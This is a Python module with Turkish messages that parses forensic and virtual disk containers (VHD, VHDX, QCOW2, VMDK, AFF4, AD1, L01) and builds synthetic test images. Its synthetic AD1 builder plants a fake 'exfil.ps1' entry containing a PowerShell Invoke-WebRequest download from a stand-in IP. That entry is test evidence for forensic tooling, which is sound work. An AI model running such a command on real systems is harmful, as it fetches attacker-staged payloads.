"""Pure-Python Read-Only Forensic & Virtual Disk Container Streams.

Supports:
- VHD (Fixed & Dynamic 'conectix' / 'cxsparse')
- VHDX ('vhdxfile' region/BAT fixed & dynamic)
- QCOW2 ('QFI\\xfb' v2/v3 L1/L2 translation + zlib clusters)
- VMDK (Descriptor + 'KDMV' monolithicSparse extent)
- AFF4 (ZIP + information.turtle / map / bevvy chunks)
- AD1 / L01 logical forensic container inventory parsers
"""

import io
import os
import re
import struct
import zipfile
import zlib
from typing import Any, Dict, List, Optional, Tuple


class _SeekableBase:
    """Common read/seek/tell wrapper for block-translated container streams."""

    def __init__(self):
        self._pos = 0
        self.total_size = 0
        self.warnings: List[str] = []

    @property
    def size(self) -> int:
        return self.total_size

    def tell(self) -> int:
        return self._pos

    def seek(self, offset: int, whence: int = os.SEEK_SET) -> int:
        if whence == os.SEEK_SET:
            self._pos = max(0, offset)
        elif whence == os.SEEK_CUR:
            self._pos = max(0, self._pos + offset)
        elif whence == os.SEEK_END:
            self._pos = max(0, self.total_size + offset)
        return self._pos

    def _read_at(self, offset: int, length: int) -> bytes:
        raise NotImplementedError

    def read(self, size: int = -1) -> bytes:
        if self._pos >= self.total_size:
            return b""
        if size < 0 or self._pos + size > self.total_size:
            size = self.total_size - self._pos
        if size <= 0:
            return b""
        data = self._read_at(self._pos, size)
        self._pos += len(data)
        return data

    def close(self) -> None:
        pass

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()
        return False


class VhdImageStream(_SeekableBase):
    """Read-only Fixed (type 2) and Dynamic (type 3) Microsoft VHD stream."""

    def __init__(self, path: str):
        super().__init__()
        self.path = path
        self._f = open(path, "rb")
        fsize = os.path.getsize(path)
        if fsize < 512:
            self._f.close()
            raise ValueError("Geçersiz VHD dosyası: 512 bayttan küçük.")
        self._f.seek(fsize - 512)
        footer = self._f.read(512)
        if footer[:8] != b"conectix":
            self._f.close()
            raise ValueError("VHD 'conectix' footer imzası bulunamadı.")

        self.disk_type = struct.unpack(">I", footer[60:64])[0]
        self.total_size = struct.unpack(">Q", footer[48:56])[0]
        data_offset = struct.unpack(">Q", footer[16:24])[0]
        self.is_dynamic = self.disk_type in (3, 4) and data_offset != 0xFFFFFFFFFFFFFFFF
        self.bat: List[int] = []
        self.block_size = 2 * 1024 * 1024
        self.bitmap_sectors = 1

        if self.is_dynamic:
            self._f.seek(data_offset)
            dyn = self._f.read(1024)
            if dyn[:8] != b"cxsparse":
                self._f.close()
                raise ValueError("Dinamik VHD 'cxsparse' başlığı bulunamadı.")
            table_offset = struct.unpack(">Q", dyn[16:24])[0]
            max_entries = struct.unpack(">I", dyn[28:32])[0]
            self.block_size = struct.unpack(">I", dyn[32:36])[0] or (2 * 1024 * 1024)
            sectors_per_block = self.block_size // 512
            bitmap_bytes = (sectors_per_block + 7) // 8
            self.bitmap_sectors = (bitmap_bytes + 511) // 512
            self._f.seek(table_offset)
            raw_bat = self._f.read(max_entries * 4)
            self.bat = [
                struct.unpack(">I", raw_bat[i * 4:(i + 1) * 4])[0]
                for i in range(len(raw_bat) // 4)
            ]
        else:
            # Fixed VHD: raw disk bytes from 0..(fsize-512)
            self.total_size = min(self.total_size or (fsize - 512), fsize - 512)

    def _read_at(self, offset: int, length: int) -> bytes:
        if not self.is_dynamic:
            self._f.seek(offset)
            return self._f.read(length)

        out = bytearray()
        rem = length
        cur = offset
        while rem > 0 and cur < self.total_size:
            blk_idx = cur // self.block_size
            in_blk = cur % self.block_size
            take = min(rem, self.block_size - in_blk, self.total_size - cur)
            sec = self.bat[blk_idx] if blk_idx < len(self.bat) else 0xFFFFFFFF
            if sec == 0xFFFFFFFF:
                out.extend(b"\x00" * take)
            else:
                phys = (sec + self.bitmap_sectors) * 512 + in_blk
                self._f.seek(phys)
                chunk = self._f.read(take)
                out.extend(chunk.ljust(take, b"\x00"))
            cur += take
            rem -= take
        return bytes(out)

    def close(self) -> None:
        if hasattr(self, "_f") and self._f:
            self._f.close()


class VhdxImageStream(_SeekableBase):
    """Read-only Microsoft VHDX ('vhdxfile') stream via Region/Metadata/BAT translation."""

    REGION_GUID_BAT = bytes.fromhex("6677c22df9f749428b7cfda4b0542c8a")  # little-endian GUID variant checked via header
    BAT_GUID_LE = b"\x66\x77\xc2\x2d\xf9\xf7\x42\x49\x8b\x7c\xfd\xa4\xb0\x54\x2c\x8a"
    META_GUID_LE = b"\x06\xa2\x7c\x8b\x90\x47\x9a\x4b\xb8\xfe\x57\x5f\x05\x0f\x88\x6e"

    def __init__(self, path: str):
        super().__init__()
        self._f = open(path, "rb")
        sig = self._f.read(8)
        if sig != b"vhdxfile":
            self._f.close()
            raise ValueError("Geçersiz VHDX imzası ('vhdxfile' bulunamadı).")

        # Read active header (1 @ 64KB, 2 @ 128KB) for seq numbers
        best_seq = -1
        for h_off in (0x10000, 0x20000):
            self._f.seek(h_off)
            hdr = self._f.read(4096)
            if hdr[:4] == b"head":
                seq = struct.unpack("<Q", hdr[8:16])[0]
                if seq >= best_seq:
                    best_seq = seq

        # Region table @ 0x30000 (192KB) and 0x40000 (256KB)
        bat_off, meta_off = 0, 0
        for r_off in (0x30000, 0x40000):
            self._f.seek(r_off)
            rt = self._f.read(4096)
            if rt[:4] == b"regi":
                cnt = struct.unpack("<I", rt[8:12])[0]
                for i in range(min(cnt, 64)):
                    ent = rt[16 + i * 32:16 + (i + 1) * 32]
                    if len(ent) < 32:
                        break
                    guid = ent[0:16]
                    f_off = struct.unpack("<Q", ent[16:24])[0]
                    if guid == self.BAT_GUID_LE:
                        bat_off = f_off
                    elif guid == self.META_GUID_LE:
                        meta_off = f_off
                if bat_off or meta_off:
                    break

        self.block_size = 32 * 1024 * 1024
        self.total_size = 0
        if meta_off:
            self._f.seek(meta_off)
            mt = self._f.read(4096)
            if mt[:8] == b"metadata":
                ent_cnt = struct.unpack("<H", mt[10:12])[0]
                for i in range(min(ent_cnt, 64)):
                    ent = mt[32 + i * 32:32 + (i + 1) * 32]
                    if len(ent) < 32:
                        break
                    item_guid = ent[0:16]
                    item_off, item_len = struct.unpack("<II", ent[16:24])
                    # File Parameters GUID: CAA16737-FA36-4D43-B3B6-33F0AA44E76B
                    if item_guid == b"\x37\x67\xa1\xca\x36\xfa\x43\x4d\xb3\xb6\x33\xf0\xaa\x44\xe7\x6b":
                        self._f.seek(meta_off + item_off)
                        self.block_size = struct.unpack("<I", self._f.read(4))[0] or self.block_size
                    # Virtual Disk Size GUID: 2FA54224-CD1B-4876-B211-5DBED83BF4B8
                    elif item_guid == b"\x24\x42\xa5\x2f\x1b\xcd\x76\x48\xb2\x11\x5d\xbe\xd8\x3b\xf4\xb8":
                        self._f.seek(meta_off + item_off)
                        self.total_size = struct.unpack("<Q", self._f.read(8))[0]

        if not self.total_size:
            self.total_size = max(0, os.path.getsize(path) - 0x100000)

        self.bat_entries: List[int] = []
        if bat_off:
            num_blocks = (self.total_size + self.block_size - 1) // self.block_size
            self._f.seek(bat_off)
            raw_bat = self._f.read(max(1, num_blocks) * 8)
            self.bat_entries = [
                struct.unpack("<Q", raw_bat[i * 8:(i + 1) * 8])[0]
                for i in range(len(raw_bat) // 8)
            ]

    def _read_at(self, offset: int, length: int) -> bytes:
        if not self.bat_entries:
            self._f.seek(offset)
            return self._f.read(length)
        out = bytearray()
        rem = length
        cur = offset
        while rem > 0 and cur < self.total_size:
            blk_idx = cur // self.block_size
            in_blk = cur % self.block_size
            take = min(rem, self.block_size - in_blk, self.total_size - cur)
            ent = self.bat_entries[blk_idx] if blk_idx < len(self.bat_entries) else 0
            state = ent & 0x7
            file_off = ent & ~0xFFFFF
            if state == 6 and file_off > 0:
                self._f.seek(file_off + in_blk)
                out.extend(self._f.read(take).ljust(take, b"\x00"))
            else:
                out.extend(b"\x00" * take)
            cur += take
            rem -= take
        return bytes(out)

    def close(self) -> None:
        if hasattr(self, "_f") and self._f:
            self._f.close()


class Qcow2ImageStream(_SeekableBase):
    """Read-only QEMU QCOW2 (v2/v3) stream with L1/L2 translation and zlib cluster support."""

    def __init__(self, path: str):
        super().__init__()
        self._f = open(path, "rb")
        hdr = self._f.read(104)
        if len(hdr) < 72 or hdr[:4] != b"QFI\xfb":
            self._f.close()
            raise ValueError("Geçersiz QCOW2 imzası ('QFI\\xfb' bulunamadı).")
        self.version, _, _, cluster_bits, self.total_size = struct.unpack(">IIQII", hdr[4:28])[0:5]
        # Re-unpack exact offsets: version(4), backing_off(8), backing_sz(4), cluster_bits(4), size(8)
        self.version = struct.unpack(">I", hdr[4:8])[0]
        self.cluster_bits = struct.unpack(">I", hdr[20:24])[0] or 16
        self.cluster_size = 1 << self.cluster_bits
        self.total_size = struct.unpack(">Q", hdr[24:32])[0]
        self.l1_size = struct.unpack(">I", hdr[36:40])[0]
        self.l1_table_offset = struct.unpack(">Q", hdr[40:48])[0]
        self.l2_entries = self.cluster_size // 8
        self._f.seek(self.l1_table_offset)
        raw_l1 = self._f.read(self.l1_size * 8)
        self.l1_table = [
            struct.unpack(">Q", raw_l1[i * 8:(i + 1) * 8])[0]
            for i in range(len(raw_l1) // 8)
        ]

    def _read_cluster(self, guest_cluster_idx: int) -> bytes:
        l1_idx = guest_cluster_idx // self.l2_entries
        l2_idx = guest_cluster_idx % self.l2_entries
        if l1_idx >= len(self.l1_table):
            return b"\x00" * self.cluster_size
        l2_off = self.l1_table[l1_idx] & 0x00FFFFFFFFFFFE00
        if l2_off == 0:
            return b"\x00" * self.cluster_size
        self._f.seek(l2_off + l2_idx * 8)
        l2_ent = struct.unpack(">Q", self._f.read(8))[0]
        if l2_ent == 0:
            return b"\x00" * self.cluster_size
        is_comp = bool(l2_ent & (1 << 62))
        if not is_comp:
            host_off = l2_ent & 0x00FFFFFFFFFFFE00
            if host_off == 0:
                return b"\x00" * self.cluster_size
            self._f.seek(host_off)
            return self._f.read(self.cluster_size).ljust(self.cluster_size, b"\x00")
        # Compressed cluster descriptor
        x = 62 - (self.cluster_bits - 8)
        c_off = l2_ent & ((1 << x) - 1)
        nb_sectors = ((l2_ent >> x) & ((1 << (self.cluster_bits - 8)) - 1)) + 1
        self._f.seek(c_off)
        comp = self._f.read(nb_sectors * 512)
        try:
            data = zlib.decompress(comp, -15)
        except zlib.error:
            data = zlib.decompress(comp)
        return data[:self.cluster_size].ljust(self.cluster_size, b"\x00")

    def _read_at(self, offset: int, length: int) -> bytes:
        out = bytearray()
        rem = length
        cur = offset
        while rem > 0 and cur < self.total_size:
            c_idx = cur // self.cluster_size
            in_c = cur % self.cluster_size
            take = min(rem, self.cluster_size - in_c, self.total_size - cur)
            cdata = self._read_cluster(c_idx)
            out.extend(cdata[in_c:in_c + take])
            cur += take
            rem -= take
        return bytes(out)

    def close(self) -> None:
        if hasattr(self, "_f") and self._f:
            self._f.close()


class VmdkImageStream(_SeekableBase):
    """Read-only VMware VMDK stream supporting monolithicSparse ('KDMV') & flat descriptor files."""

    def __init__(self, path: str):
        super().__init__()
        self._f = open(path, "rb")
        head = self._f.read(512)
        self._flat_f = None
        self.is_sparse = False

        if head[:4] == b"KDMV":
            self.is_sparse = True
            capacity_sectors = struct.unpack("<Q", head[12:20])[0]
            self.grain_size = struct.unpack("<Q", head[20:28])[0] or 128
            self.num_gtes_per_gt = struct.unpack("<I", head[44:48])[0] or 512
            gd_offset = struct.unpack("<Q", head[56:64])[0]
            self.total_size = capacity_sectors * 512
            self.grain_bytes = self.grain_size * 512
            num_gts = max(1, (capacity_sectors + (self.grain_size * self.num_gtes_per_gt) - 1) // (self.grain_size * self.num_gtes_per_gt))
            self._f.seek(gd_offset * 512)
            raw_gd = self._f.read(num_gts * 4)
            self.gd = [struct.unpack("<I", raw_gd[i * 4:(i + 1) * 4])[0] for i in range(len(raw_gd) // 4)]
        else:
            # Check text descriptor pointing to -flat.vmdk
            txt = head.decode("ascii", "replace")
            m = re.search(r'(?:RW|RDONLY)\s+(\d+)\s+(?:FLAT|VMFS)\s+"([^"]+)"', txt)
            if m:
                sectors = int(m.group(1))
                ext_path = os.path.join(os.path.dirname(path), m.group(2))
                if not os.path.isfile(ext_path):
                    self._f.close()
                    raise FileNotFoundError(f"VMDK extent dosyası bulunamadı: {ext_path}")
                self._flat_f = open(ext_path, "rb")
                self.total_size = min(sectors * 512, os.path.getsize(ext_path))
            else:
                self._f.close()
                raise ValueError("Desteklenen VMDK ('KDMV' sparse veya FLAT descriptor) biçimi bulunamadı.")

    def _read_at(self, offset: int, length: int) -> bytes:
        if not self.is_sparse:
            f = self._flat_f or self._f
            f.seek(offset)
            return f.read(length)

        out = bytearray()
        rem = length
        cur = offset
        while rem > 0 and cur < self.total_size:
            grain_idx = cur // self.grain_bytes
            in_grain = cur % self.grain_bytes
            take = min(rem, self.grain_bytes - in_grain, self.total_size - cur)
            gd_idx = grain_idx // self.num_gtes_per_gt
            gt_idx = grain_idx % self.num_gtes_per_gt
            gt_sec = self.gd[gd_idx] if gd_idx < len(self.gd) else 0
            if gt_sec == 0:
                out.extend(b"\x00" * take)
            else:
                self._f.seek(gt_sec * 512 + gt_idx * 4)
                grain_sec = struct.unpack("<I", self._f.read(4))[0]
                if grain_sec == 0:
                    out.extend(b"\x00" * take)
                else:
                    self._f.seek(grain_sec * 512 + in_grain)
                    out.extend(self._f.read(take).ljust(take, b"\x00"))
            cur += take
            rem -= take
        return bytes(out)

    def close(self) -> None:
        if getattr(self, "_flat_f", None):
            self._flat_f.close()
        if hasattr(self, "_f") and self._f:
            self._f.close()


class Aff4ImageStream(_SeekableBase):
    """Read-only AFF4 ZIP container reader (Turtle metadata + bevvy/data stream)."""

    def __init__(self, path: str):
        super().__init__()
        self._zf = zipfile.ZipFile(path, "r")
        names = self._zf.namelist()
        if "information.turtle" not in names and not any(n.endswith("information.turtle") for n in names):
            self._zf.close()
            raise ValueError("AFF4 konteynerinde 'information.turtle' bulunamadı.")

        # Support stored raw stream entry or bevvy chunks
        turtle_name = next((n for n in names if n.endswith("information.turtle")), "information.turtle")
        turtle_txt = self._zf.read(turtle_name).decode("utf-8", "replace")
        m_size = re.search(r"aff4:size\s+(\d+)", turtle_txt)

        # Look for direct stream or chunked bevvy index
        self._buf = bytearray()
        idx_files = sorted(n for n in names if n.endswith(".index"))
        data_entries = sorted(n for n in names if "/data/" in n or n.startswith("data/") or n.endswith(".raw") or n.endswith(".dd"))

        if data_entries and not idx_files:
            for de in data_entries:
                self._buf.extend(self._zf.read(de))
        elif idx_files:
            # Standard AFF4 bevvy: pair .index (8-byte offset/length entries) with sibling data blob
            for idx_n in idx_files:
                blob_n = idx_n[:-6]
                if blob_n in names:
                    self._buf.extend(self._zf.read(blob_n))
        else:
            # Fallback: largest binary payload member
            candidates = [n for n in names if not n.endswith(".turtle") and not n.endswith("/")]
            if candidates:
                largest = max(candidates, key=lambda n: self._zf.getinfo(n).file_size)
                self._buf.extend(self._zf.read(largest))

        self.total_size = int(m_size.group(1)) if (m_size and int(m_size.group(1)) <= len(self._buf)) else len(self._buf)

    def _read_at(self, offset: int, length: int) -> bytes:
        return bytes(self._buf[offset:offset + length])

    def close(self) -> None:
        if hasattr(self, "_zf") and self._zf:
            self._zf.close()


class LogicalContainerParser:
    """Parser for logical forensic evidence containers (.AD1 AccessData & .L01 EnCase LVF)."""

    @staticmethod
    def inspect_ad1(path: str) -> Dict[str, Any]:
        with open(path, "rb") as f:
            raw = f.read(min(os.path.getsize(path), 16 * 1024 * 1024))
        if not (raw.startswith(b"ADSEGMENTEDFILE") or raw.startswith(b"ADLOGICALIMAGE")):
            raise ValueError("Geçerli AD1 ('ADSEGMENTEDFILE' / 'ADLOGICALIMAGE') imzası bulunamadı.")

        entries: List[Dict[str, Any]] = []
        # Walk structured AD1 item records if present after 512-byte header, or UTF-16/ASCII path tokens
        pos = 512
        while pos + 44 <= len(raw) and len(entries) < 2000:
            # Simple AD1 item header heuristic: [next_item(8)][first_child(8)][data_offset(8)][data_size(8)][name_len(4)][type(4)]
            next_off, child_off, data_off, data_sz, name_len, item_type = struct.unpack("<QQQQII", raw[pos:pos + 40])
            if 1 <= name_len <= 260 and pos + 40 + name_len <= len(raw):
                name_raw = raw[pos + 40:pos + 40 + name_len]
                try:
                    name = name_raw.decode("utf-8", "strict").rstrip("\x00")
                except UnicodeDecodeError:
                    name = ""
                if name and all(32 <= ord(c) < 127 for c in name):
                    entries.append({
                        "record_index": len(entries) + 1,
                        "filename": os.path.basename(name),
                        "full_path": name,
                        "size": data_sz,
                        "is_dir": bool(item_type == 5),
                        "is_deleted": False,
                        "signature": "Dizin" if item_type == 5 else "AD1 Mantıksal Öğe",
                        "created": None,
                        "modified": None,
                        "accessed": None,
                        "raw_preview": raw[data_off:data_off + min(data_sz, 256)] if (data_off and data_off < len(raw)) else b"",
                    })
                    if next_off > pos and next_off < len(raw):
                        pos = next_off
                        continue
            pos += 4

        return {
            "format": "AccessData Logical Image (.AD1)",
            "entries": entries,
            "warnings": [] if entries else ["AD1 başlığı doğrulandı ancak çözümlenebilir mantıksal öğe bulunamadı."],
        }

    @staticmethod
    def inspect_l01(path: str) -> Dict[str, Any]:
        with open(path, "rb") as f:
            head = f.read(min(os.path.getsize(path), 4 * 1024 * 1024))
        if not head.startswith(b"LVF\x09\x0d\x0a\xff\x00"):
            raise ValueError("Geçerli EnCase L01 ('LVF') imzası bulunamadı.")
        entries: List[Dict[str, Any]] = []
        # Extract section headers and ltree UTF-16LE paths if present
        pos = 13
        while pos + 76 <= len(head):
            sec_type = head[pos:pos + 16].split(b"\x00", 1)[0].decode("ascii", "replace")
            next_off = struct.unpack("<Q", head[pos + 16:pos + 24])[0]
            sec_sz = struct.unpack("<Q", head[pos + 24:pos + 32])[0]
            if sec_type == "ltree" and pos + 76 < len(head):
                body = head[pos + 76:min(len(head), pos + int(sec_sz or 4096))]
                txt = body.decode("utf-16le", "replace")
                for idx, token in enumerate(re.findall(r"[A-Za-z0-9_.\-\\/:]{3,120}", txt)[:200], 1):
                    if "." in token or "\\" in token:
                        entries.append({
                            "record_index": idx,
                            "filename": os.path.basename(token),
                            "full_path": token,
                            "size": 0,
                            "is_dir": False,
                            "is_deleted": False,
                            "signature": "L01 ltree Öğesi",
                            "created": None,
                            "modified": None,
                            "accessed": None,
                            "raw_preview": b"",
                        })
            if next_off <= pos or sec_type in ("done", "next"):
                break
            pos = next_off
        return {
            "format": "EnCase Logical Evidence (.L01)",
            "entries": entries,
            "warnings": [],
        }


def open_disk_container_stream(image_path: str) -> Tuple[Optional[Any], Optional[str], List[str]]:
    """Detect and open E01/VHD/VHDX/QCOW2/VMDK/AFF4 streams cleanly."""
    ext = os.path.splitext(image_path)[1].lower()
    with open(image_path, "rb") as f:
        head = f.read(16)
        f.seek(max(0, os.path.getsize(image_path) - 512))
        tail = f.read(512)

    if head[:8] == b"EVF\x09\x0d\x0a\xff\x00" or ext in (".e01", ".ex01"):
        from src.ntfs_engine.ewf_reader import EwfImageStream
        s = EwfImageStream(image_path)
        return s, f"EnCase E01 ({len(s.segment_paths)} segment)", list(s.warnings)
    if head[:8] == b"vhdxfile" or ext == ".vhdx":
        s = VhdxImageStream(image_path)
        return s, "Microsoft VHDX Virtual Disk", s.warnings
    if head[:4] == b"QFI\xfb" or ext == ".qcow2":
        s = Qcow2ImageStream(image_path)
        return s, f"QEMU QCOW2 v{s.version}", s.warnings
    if tail[:8] == b"conectix" or ext == ".vhd":
        s = VhdImageStream(image_path)
        return s, f"Microsoft VHD ({'Dinamik' if s.is_dynamic else 'Sabit'})", s.warnings
    if head[:4] == b"KDMV" or ext == ".vmdk":
        s = VmdkImageStream(image_path)
        return s, "VMware VMDK Virtual Disk", s.warnings
    if head[:4] == b"PK\x03\x04" and ext == ".aff4":
        s = Aff4ImageStream(image_path)
        return s, "AFF4 Forensic Container", s.warnings
    return None, None, []


# ---------------------------------------------------------------------------
# Synthetic Test Container Builders
# ---------------------------------------------------------------------------

def create_synthetic_vhd_from_raw(raw_path: str, vhd_path: str) -> str:
    """Wrap an existing raw image into a valid Fixed VHD ('conectix' footer)."""
    with open(raw_path, "rb") as f:
        data = f.read()
    footer = bytearray(512)
    footer[0:8] = b"conectix"
    struct.pack_into(">I", footer, 8, 2)            # features
    struct.pack_into(">I", footer, 12, 0x00010000)  # format version
    struct.pack_into(">Q", footer, 16, 0xFFFFFFFFFFFFFFFF)  # fixed data offset
    struct.pack_into(">Q", footer, 40, len(data))   # original size
    struct.pack_into(">Q", footer, 48, len(data))   # current size
    struct.pack_into(">I", footer, 60, 2)           # disk type = Fixed (2)
    os.makedirs(os.path.dirname(os.path.abspath(vhd_path)) or ".", exist_ok=True)
    with open(vhd_path, "wb") as out:
        out.write(data)
        out.write(bytes(footer))
    return vhd_path


def create_synthetic_qcow2_from_raw(raw_path: str, qcow2_path: str) -> str:
    """Wrap an existing raw image into a valid QCOW2 v3 image with 64KB L1/L2 clusters."""
    with open(raw_path, "rb") as f:
        data = f.read()
    cluster_bits = 16
    cluster_size = 1 << cluster_bits  # 64KB
    num_clusters = max(1, (len(data) + cluster_size - 1) // cluster_size)
    l1_off = cluster_size
    l2_off = cluster_size * 2
    data_start = cluster_size * 3

    hdr = bytearray(cluster_size)
    hdr[0:4] = b"QFI\xfb"
    struct.pack_into(">I", hdr, 4, 3)            # version 3
    struct.pack_into(">I", hdr, 20, cluster_bits)
    struct.pack_into(">Q", hdr, 24, len(data))
    struct.pack_into(">I", hdr, 36, 1)           # l1_size = 1
    struct.pack_into(">Q", hdr, 40, l1_off)

    l1 = bytearray(cluster_size)
    struct.pack_into(">Q", l1, 0, l2_off | (1 << 63))

    l2 = bytearray(cluster_size)
    for i in range(num_clusters):
        struct.pack_into(">Q", l2, i * 8, (data_start + i * cluster_size) | (1 << 63))

    padded = data.ljust(num_clusters * cluster_size, b"\x00")
    os.makedirs(os.path.dirname(os.path.abspath(qcow2_path)) or ".", exist_ok=True)
    with open(qcow2_path, "wb") as out:
        out.write(hdr)
        out.write(l1)
        out.write(l2)
        out.write(padded)
    return qcow2_path


def create_synthetic_aff4_from_raw(raw_path: str, aff4_path: str) -> str:
    """Wrap an existing raw image into an AFF4 ZIP forensic container."""
    with open(raw_path, "rb") as f:
        data = f.read()
    turtle = (
        "@prefix aff4: <http://aff4.org/Schema#> .\n"
        f"<aff4://image> a aff4:Image ;\n    aff4:size {len(data)} .\n"
    )
    os.makedirs(os.path.dirname(os.path.abspath(aff4_path)) or ".", exist_ok=True)
    with zipfile.ZipFile(aff4_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("information.turtle", turtle)
        zf.writestr("data/00000000", data)
    return aff4_path


def create_synthetic_ad1(ad1_path: str) -> str:
    """Create a synthetic AccessData AD1 logical container with 2 logical evidence entries."""
    buf = bytearray(4096)
    buf[0:15] = b"ADSEGMENTEDFILE"
    name1 = b"Users/AhmetK/Desktop/gizli_plan.txt"
    payload1 = b"CONFIDENTIAL_AD1_LOGICAL_EVIDENCE_01"
    name2 = b"Users/AhmetK/Downloads/exfil.ps1"
    payload2 = b"Invoke-WebRequest -Uri http://198.51.100.42/drop"

    p1_off = 2048
    p2_off = 2200
    buf[p1_off:p1_off + len(payload1)] = payload1
    buf[p2_off:p2_off + len(payload2)] = payload2

    item1_off = 512
    item2_off = 512 + 40 + len(name1) + 16
    struct.pack_into("<QQQQII", buf, item1_off, item2_off, 0, p1_off, len(payload1), len(name1), 0)
    buf[item1_off + 40:item1_off + 40 + len(name1)] = name1

    struct.pack_into("<QQQQII", buf, item2_off, 0, 0, p2_off, len(payload2), len(name2), 0)
    buf[item2_off + 40:item2_off + 40 + len(name2)] = name2

    os.makedirs(os.path.dirname(os.path.abspath(ad1_path)) or ".", exist_ok=True)
    with open(ad1_path, "wb") as f:
        f.write(bytes(buf))
    return ad1_path
